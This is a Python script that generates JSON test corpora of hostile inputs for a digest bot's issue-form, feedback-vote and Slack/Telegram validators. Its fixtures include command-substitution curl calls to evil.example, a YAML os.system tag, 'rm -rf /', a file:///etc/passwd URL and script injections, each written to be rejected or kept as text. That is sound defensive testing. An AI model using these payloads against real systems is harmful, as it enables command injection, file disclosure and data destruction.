"""Regenerates corpus/hostile-text/*.json: hostile text for the Phase 6 channels (Appendix C 101).

  python scripts/make_text_corpus.py [--out corpus/hostile-text]

onboarding.json  Issue-form answers an attacker or a confused owner could submit.
feedback.json    Issue payloads for the feedback vote reader.
chat.json        Item text that must not become a mention, link, command or fake item in Slack
                 or Telegram.
Consumed by axon-template (tests/test_text_corpus.py). Every case carries an `expect`, and every
string that must never be echoed is a unique marker, so a replay can assert it by search."""

from __future__ import annotations

import argparse
import json
from pathlib import Path
from typing import Any

ENT = "Companies, models or repos to follow"
TZ = "Timezone (IANA name)"
TIME = "Send time (24h, local)"
MAX = "Maximum items per digest"
LANG = "Language code"
RSS = "Extra RSS feeds"
INC = "Keywords to include"
EXC = "Keywords to exclude"
BASE = "Summarizer base URL (openai_compatible only)"
PROV = "Summarizer provider"
CHAN = "Delivery channel"
ACK = "Secrets"

ONBOARDING: list[dict[str, Any]] = []
FEEDBACK: list[dict[str, Any]] = []
CHAT: list[dict[str, Any]] = []


def onb(cid: str, note: str, expect: str, marker: str, **fields: Any) -> None:
    """`set` maps a form label to a replacement answer; `marker` must never reach any output."""
    ONBOARDING.append({"id": cid, "note": note, "expect": expect, "marker": marker, "set": fields})


def accepted(cid: str, note: str, marker: str, label: str, value: list[str]) -> None:
    onb(cid, note, "accepted", marker, **{label: value})


def rejected(cid: str, note: str, marker: str, label: str, value: Any) -> None:
    onb(cid, note, "rejected", marker, **{label: value})


def build_onboarding() -> None:
    m = "ZQ7-ONB-"
    accepted(
        "shell-substitution",
        "command substitution stays text",
        m + "01",
        ENT,
        ["Qwen", f"$(curl https://evil.example/{m}01)"],
    )
    accepted("shell-backticks", "backticks stay text", m + "02", ENT, [f"`id {m}02`"])
    accepted(
        "actions-expression",
        "an Actions expression stays text",
        m + "03",
        INC,
        [f"${{{{ secrets.LLM_API_KEY }}}} {m}03"],
    )
    accepted("html-script", "html stays text", m + "04", EXC, [f"<script>alert('{m}04')</script>"])
    accepted(
        "markdown-link",
        "a markdown link is not rendered",
        m + "05",
        ENT,
        [f"[click](https://evil.example/{m}05)"],
    )
    accepted("yaml-anchor", "yaml syntax is data", m + "06", ENT, [f"&a [*a] {m}06"])
    accepted(
        "yaml-python-tag",
        "a python tag is data",
        m + "07",
        ENT,
        [f"!!python/object/apply:os.system [echo {m}07]"],
    )
    accepted(
        "yaml-key-injection",
        "a fake key line stays an entry; agent_access is unchanged",
        m + "08",
        ENT,
        ["Qwen", f"agent_access: {{allowed_modes: [digest]}} {m}08"],
    )
    accepted(
        "bidi-override", "a bidi control stays text and is never echoed", m + "09", ENT, [f"‮{m}09"]
    )
    accepted("emoji-and-cjk", "unicode is fine", m + "10", ENT, [f"\U0001f916 日本語 {m}10"])
    rejected("zone-shell", "a shell tail in the timezone", m + "11", TZ, f"UTC; echo {m}11")
    rejected(
        "zone-newline", "a second line in a one-line field", m + "12", TZ, f"UTC\nsummarizer: {m}12"
    )
    rejected("time-quote", "a quote in the time", m + "13", TIME, f'07:30" ; echo {m}13')
    rejected("max-huge", "an integer too large", m + "14", MAX, "9" * 40 + m)
    rejected("max-exponent", "scientific notation", m + "15", MAX, f"1e9 {m}15")
    rejected("max-fullwidth", "fullwidth digits", m + "16", MAX, "１０")
    rejected("lang-long", "a language that is a sentence", m + "17", LANG, f"English please {m}17")
    rejected("rss-file", "a file URL", m + "18", RSS, [f"file:///etc/passwd#{m}18"])
    rejected("rss-javascript", "a javascript URL", m + "19", RSS, [f"javascript:alert('{m}19')"])
    rejected(
        "rss-credentials",
        "credentials in a URL",
        m + "20",
        RSS,
        [f"https://user:{m}20@feeds.example.org/a.xml"],
    )
    rejected("rss-http-space", "a space in a URL", m + "21", RSS, [f"https://x.example/a b {m}21"])
    rejected("base-url-http", "http is refused", m + "22", BASE, f"http://llm.example.org/{m}22")
    rejected(
        "base-url-credentials",
        "credentials in the base URL",
        m + "23",
        BASE,
        f"https://u:{m}23@llm.example.org/v1",
    )
    rejected("channel-forged", "a channel that is not listed", m + "24", CHAN, f"sms {m}24")
    rejected("provider-forged", "a provider that is not listed", m + "25", PROV, f"openai {m}25")
    rejected("nul-byte", "a NUL byte in an entry", m + "26", ENT, [f"a\u0000{m}26"])
    rejected(
        "escape-sequence", "a terminal escape in an entry", m + "27", ENT, [f"a\u001b[31m{m}27"]
    )
    rejected(
        "heading-forgery",
        "a repeated known heading inside an answer",
        m + "28",
        ENT,
        ["Qwen", f"### {CHAN}", f"slack {m}28"],
    )
    rejected("too-many-entries", "51 entries", m + "29", ENT, [f"e{i}" for i in range(51)])
    rejected(
        "overlong-entry", "an entry of 3000 characters", m + "30", ENT, [m + "30" + "x" * 3000]
    )
    rejected("no-acknowledgement", "the secrets box is not ticked", m + "31", ACK, [])
    ONBOARDING.append(
        {
            "id": "oversize-body",
            "note": "a body over the size cap",
            "expect": "rejected",
            "marker": m + "32",
            "set": {},
            "append": {"repeat": "x", "times": 25000, "prefix": m + "32"},
        }
    )
    ONBOARDING.append(
        {
            "id": "empty-body",
            "note": "nothing at all",
            "expect": "rejected",
            "marker": m + "33",
            "set": {},
            "raw": "",
        }
    )
    ONBOARDING.append(
        {
            "id": "unknown-heading-block",
            "note": "an invented section is ignored",
            "expect": "accepted",
            "marker": m + "34",
            "set": {},
            "append": {"literal": f"### Admin override\n\n{m}34\n\n"},
        }
    )


def fb(cid: str, note: str, expect: str, body: Any, **over: Any) -> None:
    issue: dict[str, Any] = {
        "number": 7,
        "state": "open",
        "author_association": "OWNER",
        "user": {"type": "User"},
        "body": body,
    }
    issue.update(over)
    FEEDBACK.append({"id": cid, "note": note, "expect": expect, "issue": issue})


def build_feedback() -> None:
    a, b = "a" * 16, "0123456789abcdef"
    fb("vote-up", "one valid vote", "counted", f"item:{a} vote:up")
    fb("vote-down-crlf", "CRLF line endings", "counted", f"item:{a} vote:down\r\nitem:{b} vote:up")
    fb("ten-votes", "the maximum", "counted", "\n".join(f"item:{a} vote:up" for _ in range(10)))
    fb(
        "eleven-votes",
        "one over the maximum",
        "ignored",
        "\n".join(f"item:{a} vote:up" for _ in range(11)),
    )
    fb("trailing-text", "text after the vote", "ignored", f"item:{a} vote:up; rm -rf /")
    fb(
        "extra-line",
        "an extra prose line",
        "ignored",
        f"item:{a} vote:up\nplease also visit evil.example",
    )
    fb("html-after", "html after the vote", "ignored", f"item:{a} vote:up\n<script>x</script>")
    fb("uppercase-id", "uppercase hex", "ignored", f"item:{a.upper()} vote:up")
    fb("short-id", "a short id", "ignored", "item:abc vote:up")
    fb("long-id", "a 17 character id", "ignored", f"item:{a}a vote:up")
    fb("bad-vote", "a vote that is not up or down", "ignored", f"item:{a} vote:sideways")
    fb(
        "zero-width-in-id",
        "a zero width space in the id",
        "ignored",
        f"item:{a[:8]}​{a[8:]} vote:up",
    )
    fb("fullwidth-colon", "a fullwidth colon", "ignored", f"item：{a} vote:up")
    fb("empty-body", "an empty body", "ignored", "")
    fb("whitespace-body", "only whitespace", "ignored", " \n \n")
    fb("oversize-body", "a body over the cap", "ignored", f"item:{a} vote:up\n" + "x" * 3000)
    fb("body-not-text", "a body that is not text", "ignored", None)
    fb("body-number", "a numeric body", "ignored", 12345)
    fb(
        "stranger",
        "an author with no association",
        "ignored",
        f"item:{a} vote:up",
        author_association="NONE",
    )
    fb(
        "contributor",
        "a contributor is not enough",
        "ignored",
        f"item:{a} vote:up",
        author_association="CONTRIBUTOR",
    )
    fb(
        "first-timer",
        "a first-time contributor",
        "ignored",
        f"item:{a} vote:up",
        author_association="FIRST_TIME_CONTRIBUTOR",
    )
    fb(
        "collaborator",
        "a collaborator counts",
        "counted",
        f"item:{a} vote:down",
        author_association="COLLABORATOR",
    )
    fb("bot-author", "a bot is ignored", "ignored", f"item:{a} vote:up", user={"type": "Bot"})
    fb("no-user", "no user object", "ignored", f"item:{a} vote:up", user=None)
    fb("pull-request", "a pull request", "ignored", f"item:{a} vote:up", pull_request={"url": "x"})
    fb("closed-issue", "an already closed issue", "ignored", f"item:{a} vote:up", state="closed")
    fb("number-bool", "a boolean number", "ignored", f"item:{a} vote:up", number=True)
    fb("number-zero", "number zero", "ignored", f"item:{a} vote:up", number=0)
    fb("number-negative", "a negative number", "ignored", f"item:{a} vote:up", number=-4)
    fb("number-text", "a text number", "ignored", f"item:{a} vote:up", number="7")


def chat(cid: str, text: str, slack: list[str], telegram: list[str]) -> None:
    CHAT.append({"id": cid, "text": text, "slack_forbidden": slack, "telegram_forbidden": telegram})


def build_chat() -> None:
    chat("slack-channel-mention", "<!channel> wake everyone", ["<!channel>"], [])
    chat("slack-here-mention", "<!here> now", ["<!here>"], [])
    chat("slack-user-mention", "<@U0123ABCD> look", ["<@U0123ABCD>"], [])
    chat("slack-channel-link", "<#C0123ABCD|general> post here", ["<#C0123ABCD"], [])
    chat(
        "slack-labelled-link",
        "<https://evil.example/ZQ7|Click here>",
        ["<https://evil.example"],
        [],
    )
    chat("slack-subteam", "<!subteam^S0123ABCD> page", ["<!subteam"], [])
    chat("slack-date-token", "<!date^1700000000^{date}|x>", ["<!date"], [])
    chat("slack-entities", "&lt;!channel&gt; already escaped", ["<!channel>"], [])
    chat(
        "markdown-emphasis",
        "*bold* _italic_ ~strike~ `code`",
        ["*bold*", "~strike~", "`code`"],
        ["*bold*", "_italic_", "~strike~", "`code`"],
    )
    chat("code-fence", "```\nblock\n```", ["```"], ["```"])
    chat(
        "markdown-link",
        "[click](https://evil.example/ZQ7)",
        [],
        ["[click](https://evil.example/ZQ7)"],
    )
    chat(
        "markdown-image",
        "![x](https://evil.example/ZQ7.png)",
        [],
        ["![x](https://evil.example/ZQ7.png)"],
    )
    chat("spoiler", "||hidden||", [], ["||hidden||"])
    chat(
        "quote-and-fake-item",
        "title\n> quote\n2. Fake item",
        ["\n> quote", "\n2. Fake item"],
        ["\n> quote", "\n2. Fake item"],
    )
    chat("heading-and-rule", "x\n# heading\n---\n+ plus", [], ["\n# heading", "\n---", "\n+ plus"])
    chat("pipe-label", "a|b|c", [], [])
    chat("backslash-run", "a\\\\\\*b\\", [], [])
    chat("bidi-and-zero-width", "‮txt​⁦", [], [])
    chat("very-long-word", "A" * 6000, [], [])
    chat("emoji-surrogates", "\U0001f600" * 2500, [], [])


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--out", type=Path, default=Path("corpus/hostile-text"))
    args = ap.parse_args(argv)
    ONBOARDING.clear()
    FEEDBACK.clear()
    CHAT.clear()
    build_onboarding()
    build_feedback()
    build_chat()
    args.out.mkdir(parents=True, exist_ok=True)
    for name, cases in (("onboarding", ONBOARDING), ("feedback", FEEDBACK), ("chat", CHAT)):
        text = json.dumps(cases, indent=1, sort_keys=True, ensure_ascii=True) + "\n"
        (args.out / f"{name}.json").write_text(text, encoding="utf-8", newline="\n")
        print(f"wrote {len(cases)} cases to {args.out / (name + '.json')}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
